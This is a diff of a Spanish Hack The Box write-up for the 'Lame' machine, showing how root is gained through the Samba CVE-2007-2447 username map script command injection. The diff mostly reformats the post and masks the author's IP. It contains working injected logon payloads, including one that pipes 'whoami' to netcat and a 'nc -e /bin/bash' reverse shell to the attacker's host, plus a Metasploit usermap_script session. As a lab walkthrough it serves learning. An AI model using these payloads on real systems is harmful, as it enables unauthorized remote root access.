@@ -16,14 +16,15 @@ tags:
   - Samba
   - FTP Enumeration
   - Samba Enumeration
-  - Username Map Script Command Execution (UMSCE) 
+  - Username Map Script Command Execution (UMSCE)
+  - CVE-2007-2447
   - Command Injection
-  - Privesc - UMSCE (CVE-2007-2447)
+  - Privesc - UMSCE
   - OSCP Style
   - Metasploit Framework
 ---
-
 ![](/assets/images/htb-writeup-lame/lame_logo.png)
+
 La **máquina Lame** es una de las primeras máquinas que hice, justo después del **Starting Point**, obviamente necesité mucha ayuda porque había cosas que aún no comprendía del todo. Es una máquina super fácil, ya que lo único que haremos será utilizar el **servicio Samba** para poder obtener acceso directo a la máquina. Para esto, haremos enumeración a un **servicio FTP** para encontrar información que nos sea útil, al no encontrar nada,  usamos un Exploit para la versión del FTP (**CVE-2011-2523**) para crear una **Backdoor** en la máquina víctima, pero no funcionara, por lo que mejor decidimos enumerar el **servicio Samba** con **smbclient**, para ver si encontramos algo útil. Al tampoco encontrar nada, usamos el Exploit **CVE-2007-2447** para obtener acceso a la máquina como **usuario root**, usando el Exploit  tanto en **estilo OSCP** como en **estilo Metasploit**.
 
 Herramientas utilizadas para resolver está máquina:
@@ -50,7 +51,7 @@ Herramientas utilizadas para resolver está máquina:
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
 				<li><a href="#FTP">Enumeración Servicio FTP</a></li>
-				<li><a href="#Samba">Enumeración Servicio Samba</a></li>
+				<li><a href="#SMB">Enumeración Servicio SMB</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
@@ -58,7 +59,7 @@ Herramientas utilizadas para resolver está máquina:
                                 <ul>
                                         <li><a href="#PruebaExp">Probando Exploit: vsftpd 2.3.4 - Backdoor Command Execution</a></li>
                                 </ul>
-				<li><a href="#Busqueda">Buscando, Analizando y Probando un Exploit para Servicio Samba</a></li>
+				<li><a href="#Busqueda">Buscando, Analizando y Probando un Exploit para Servicio SMB</a></li>
 				<ul>
                                         <li><a href="#PruebaExp2">Probando Exploit: Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)</a></li>
                                 </ul>
@@ -80,10 +81,7 @@ Herramientas utilizadas para resolver está máquina:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:125%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -217,10 +215,7 @@ Nmap done at Wed Jan 11 14:11:32 2023 -- 1 IP address (1 host up) scanned in 54.
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:125%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -251,6 +246,7 @@ drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
 ftp> exit
 221 Goodbye
 ```
+
 Nada, no hay nada que podamos usar. Así que, vamos a intentar probar si podemos subir archivos:
 ```bash
 ftp> put /etc/passwd
@@ -260,9 +256,9 @@ local: /etc/passwd remote: /etc/passwd
 ```
 No se puede, por lo que deducimos que no tenemos permisos de escritura. Aunque, quizá hay un exploit que podamos usar aquí.
 
-<h2 id="Samba">Enumeración Servicio Samba</h2>
+<h2 id="SMB">Enumeración Servicio SMB</h2>
 
-Ahora nos logueamos en el Samba para ver que hay dentro, lo haremos de una forma sin que tengamos que meter un usuario.
+Ahora nos logueamos en el **servicio SMB** para ver que hay dentro, lo haremos de una forma sin que tengamos que meter un usuario.
 
 Primero vamos a tratar de mostrar los recursos compartidos que estén a nivel de red, para ver si hay algo útil.
 ```bash
@@ -287,12 +283,13 @@ Anonymous login successful
         WORKGROUP            LAME
 ```
 
-| Parámetros | Descripción |
-|--------------------------|
-| *-L*         | Sirve para listar los recursos compartidos. |
-| *-N*	     | Sirve para que no nos pida usuario y contraseña para logearnos, osea una Null Session. |
+| Parámetros  | Descripción |
+|---------------------------|
+| *-L*        | Sirve para listar los recursos compartidos. |
+| *-N*	      | Sirve para que no nos pida usuario y contraseña para logearnos, osea una Null Session. |
 | *--option 'client min protocol = NT1'* | Sirve para conectarnos a servicios Samba viejos. |
 
+<br>
 
 Observamos ahí algo curioso en el **recurso tmp**, puede que ahí tengamos algo que nos ayude así que vamos a logearnos directamente ahí:
 ```bash
@@ -319,10 +316,7 @@ Pues no veo nada útil, bueno que yo sepa ahí no nos sirve algo, así que mejor
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:125%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -330,7 +324,6 @@ Pues no veo nada útil, bueno que yo sepa ahí no nos sirve algo, así que mejor
 <h2 id="Exploit">Buscando un Exploit para Servicio FTP</h2>
 
 Recordemos que tenemos la versión del **servicio FTP** de la máquina víctima, por lo que podemos investigar si hay un exploit que nos sirva para vulnerar dicha máquina.
-
 ```bash
 searchsploit vsftpd 2.3.4  
 ---------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -343,10 +336,11 @@ Shellcodes: No Results
 Papers: No Results
 ```
 
+<br>
+
 <h3 id="PruebaExp">Probando Exploit: vsftpd 2.3.4 - Backdoor Command Execution</h3>
 
 Encontramos un exploit creado en **Python**, vamos a analizarlo, utiliza el comando `searchsploit -x unix/remote/49757.py` para analizar el exploit:
-
 ```bash
 signal(SIGINT, handler)
 parser=argparse.ArgumentParser()
@@ -370,16 +364,19 @@ print('Send `exit` to quit shell')
 tn2.interact()
 
 ```
+
 | Parámetros | Descripción |
 |--------------------------|
-| *-x*         | Para poder leer el Exploit. |
-| *-m*         | Para copiar el Exploit en el directorio actual. |
+| *-x*       | Para poder leer el Exploit. |
+| *-m*       | Para copiar el Exploit en el directorio actual. |
 
-Lo que hace este Exploit es, tratar de conectarnos al **servicio FTP** a través del puerto 6200 (o eso entiendo), pero no creo que funcione porque dicho puerto no está abierto, así que no perdamos tiempo y mejor analicemos el servicio Samba.
+<br>
+
+Lo que hace este Exploit es, tratar de conectarnos al **servicio FTP** a través del **puerto 6200** (o eso entiendo), pero no creo que funcione porque dicho puerto no está abierto, así que no perdamos tiempo y mejor analicemos el servicio Samba.
 
 <h2 id="Busqueda">Buscando, Analizando y Probando un Exploit para Servicio Samba</h2>
 
-Como mencione anteriormente como no encontramos mucho aquí lo que podemos hacer es buscar un exploit que nos ayude.
+Como mencione anteriormente, como no encontramos mucho en el **servicio SMB** lo que podemos hacer es buscar un exploit para el **servicio Samba** que nos ayude.
 ```bash
 searchsploit Samba 3.0.20      
 ---------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -394,10 +391,11 @@ Shellcodes: No Results
 Papers: No Results
 ```
 
+<br>
+
 <h3 id="PruebaExp2">Probando Exploit: Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)</h3>
 
 Vamos a analizar el exploit que esta hecho en ruby, ósea el **Username Map Script**. El exploit es usado en **Metasploit** de forma automatizada pero analicemos cual es el exploit que usa. Recuerda usar el comando **searchsploit -x** para analizar el exploit.
-
 ```ruby
 def exploit
 
@@ -423,45 +421,49 @@ tcpdump -i tun0 icmp -n
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ```
-Desde el **servidor Samba** mandamos la traza:
+
+Desde el **servidor SMB** mandamos la traza:
 ```bash
-smb: \> logon "/=`nohup ping 10.10.14.8`"
+smb: \> logon "/=`nohup ping Tu_IP`"
 Password: 
 ```
+
 Resultado:
 ```bash
 tcpdump -i tun0 icmp -n
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
-14:31:22.510983 IP 10.10.10.3 > 10.10.14.8: ICMP echo request, id 58134, seq 1, length 64
-14:31:22.510993 IP 10.10.14.8 > 10.10.10.3: ICMP echo reply, id 58134, seq 1, length 64
-14:31:23.517887 IP 10.10.10.3 > 10.10.14.8: ICMP echo request, id 58134, seq 2, length 64
-14:31:23.517925 IP 10.10.14.8 > 10.10.10.3: ICMP echo reply, id 58134, seq 2, length 64
-14:31:24.516644 IP 10.10.10.3 > 10.10.14.8: ICMP echo request, id 58134, seq 3, length 64
-14:31:24.516654 IP 10.10.14.8 > 10.10.10.3: ICMP echo reply, id 58134, seq 3, length 64
-14:31:25.516771 IP 10.10.10.3 > 10.10.14.8: ICMP echo request, id 58134, seq 4, length 64
-14:31:25.516781 IP 10.10.14.8 > 10.10.10.3: ICMP echo reply, id 58134, seq 4, length 64
+14:31:22.510983 IP 10.10.10.3 > Tu_IP: ICMP echo request, id 58134, seq 1, length 64
+14:31:22.510993 IP Tu_IP > 10.10.10.3: ICMP echo reply, id 58134, seq 1, length 64
+14:31:23.517887 IP 10.10.10.3 > Tu_IP: ICMP echo request, id 58134, seq 2, length 64
+14:31:23.517925 IP Tu_IP > 10.10.10.3: ICMP echo reply, id 58134, seq 2, length 64
+14:31:24.516644 IP 10.10.10.3 > Tu_IP: ICMP echo request, id 58134, seq 3, length 64
+14:31:24.516654 IP Tu_IP > 10.10.10.3: ICMP echo reply, id 58134, seq 3, length 64
+14:31:25.516771 IP 10.10.10.3 > Tu_IP: ICMP echo request, id 58134, seq 4, length 64
+14:31:25.516781 IP Tu_IP > 10.10.10.3: ICMP echo reply, id 58134, seq 4, length 64
 ^C
 8 packets captured
 8 packets received by filter
 0 packets dropped by kernel
 ```
+
 Esto quiere decir que si podemos inyectar comandos, hagamos otra prueba. Esta vez, alzaremos una **netcat** para probar si podemos conectar una **terminal bash**.
 ```bash
 nc -lvnp 443           
 listening on [any] 443 ...
 ```
-Inyectando comando, desde la **sesión de Samba**:
-```bash
-smb: \> logon "/=`nohup whoami | nc 10.10.14.8 443`"
-Password: 
 
+Inyectando comando, desde la **sesión de SMB**:
+```bash
+smb: \> logon "/=`nohup whoami | nc Tu_IP 443`"
+Password: 
 ```
+
 Resultado en la **netcat**:
 ```bash
 nc -lvnp 443           
 listening on [any] 443 ...
-connect to [10.10.14.8] from (UNKNOWN) [10.10.10.3] 32800
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.3] 32800
 root
 ```
 
@@ -470,10 +472,7 @@ root
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:125%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
@@ -482,7 +481,7 @@ root
 
 Como ya vimos en las pruebas anteriores, podemos tratar de conectar una **terminal bash** a la máquina víctima, así que alzaremos una **netcat** y veremos si podemos activarla.
 ```bash
-logon "/=`nohup nc -e /bin/bash 10.10.14.8 443`"
+logon "/=`nohup nc -e /bin/bash Tu_IP 443`"
 Password:
 
 ```
@@ -491,7 +490,7 @@ EUREKA!!!
 ```bash
 nc -lvnp 443
 listening on [any] 443 ...
-connect to [10.10.14.8] from (UNKNOWN) [10.10.10.3] 57427
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.3] 57427
 whoami
 root
 script /dev/null -c bash
@@ -504,6 +503,7 @@ Presionamos **crtl + Z** para suspender la sesión del **netcat**. Y aplicamos e
 stty raw -echo; fg                                                                                            
 [1]  + continued  nc -lvnp 443
 ```
+
 Y solamente escribimos `reset xterm` para que se resetee la terminal y ya aparezca la **terminal bash** más interactiva.
 ```bash
 stty raw -echo; fg                                                                                            
@@ -519,6 +519,7 @@ boot   home        lib             nohup.out  sbin  usr
 cdrom  initrd      lost+found      opt        srv   var
 dev    initrd.img  media           proc       sys   vmlinu
 ```
+
 Ahora solamente buscamos la flag del root y del usuario:
 ```bash
 root@lame:/# find \-name user.txt
@@ -536,10 +537,7 @@ Y listo ya quedo esta máquina al **estilo OSCP**.
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Otras" style="text-align:center;">Otras Formas</h1>
-  <button style="position:absolute; left:80%; top:125%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Otras" style="text-align:center;">Otras Formas</h1>
 </div>
 <br>
 
@@ -553,6 +551,7 @@ Para comenzar a usar Metasploit primero debemos iniciar la base de datos de este
 msfdb start                                                                      
 [+] Starting database
 ```
+
 Y ya podemos iniciar la consola interactiva de **Metasploit**:
 ```bash
 msfconsole 
@@ -591,14 +590,15 @@ Matching Modules
 
 Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
 ```
+
 Para usarlo solamente escribimos el nombre y el comando **use**:
 ```
 msf6 > use exploit/multi/samba/usermap_script
 [*] No payload configured, defaulting to cmd/unix/reverse_netcat
 msf6 exploit(multi/samba/usermap_script) >
 ```
-Para ver cómo usarlo, usamos el comando **show options**:
 
+Para ver cómo usarlo, usamos el comando **show options**:
 ```bash
 msf6 exploit(multi/samba/usermap_script) > show options
 
@@ -614,7 +614,7 @@ Payload options (cmd/unix/reverse_netcat):
 
    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
-   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
+   LHOST  **.**.**.**        yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port
 
 
@@ -624,27 +624,27 @@ Exploit target:
    --  ----
    0   Automatic
 
-
-
 View the full module info with the info, or info -d command.
 ```
+
 Solamente cambiamos lo que nos pide, que sería el **RHOST, LHOST y el LPORT**:
 ```bash
 msf6 exploit(multi/samba/usermap_script) > set RHOST 10.10.10.3
 RHOST => 10.10.10.3
 
-msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.8
-LHOST => 10.10.14.8
+msf6 exploit(multi/samba/usermap_script) > set LHOST Tu_IP
+LHOST => Tu_IP
 
 msf6 exploit(multi/samba/usermap_script) > set LPORT 443
 LPORT => 443
 ```
+
 Y ahora si para terminar solo damos en exploit y aplicara todo el proceso:
 ```bash
 msf6 exploit(multi/samba/usermap_script) > exploit
 
-[*] Started reverse TCP handler on 10.10.14.8:443 
-[*] Command shell session 1 opened (10.10.14.8:443 -> 10.10.10.3:48482) at 2023-03-16 16:07:21 -0600
+[*] Started reverse TCP handler on Tu_IP:443 
+[*] Command shell session 1 opened (Tu_IP:443 -> 10.10.10.3:48482) at 2023-03-16 16:07:21 -0600
 
 whoami
 root
@@ -656,6 +656,7 @@ uid=0(root) gid=0(root)
 root@lame:/# exit
 exit
 ```
+
 Antes de terminar todo, salimos con exit y debemos apagar la base de datos de **Metasploit**:
 ```bash
 root@lame:/# exit
@@ -676,3 +677,48 @@ msf6 exploit(multi/samba/usermap_script) > exit
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
